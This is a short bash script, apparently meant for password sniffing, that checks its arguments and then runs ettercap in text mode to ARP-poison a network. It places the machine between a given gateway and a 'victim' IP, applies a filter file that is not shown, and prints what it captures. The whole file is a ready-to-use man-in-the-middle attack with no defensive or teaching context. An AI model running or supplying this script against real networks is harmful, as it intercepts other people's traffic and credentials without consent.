#!/bin/bash

# USAGE: ./ettercap_sniff_password_01.sh 192.168.1.1 192.168.1.101

if ! command -v ettercap &> /dev/null
then
    echo "Ettercap is not installed. Please install it first."
    exit 1
fi

if [ -z "$1" ]
then
    echo "Please provide the gateway IP address as the first argument."
    exit 2
fi

if [ -z "$2" ]
then
    echo "Please provide the victim IP address as the second argument."
    exit 3
fi

TMPFILE=$(mktemp)

ettercap -T -q -F etter.filter -M arp:remote /$1/ /$2/ > $TMPFILE

cat $TMPFILE

rm $TMPFILE
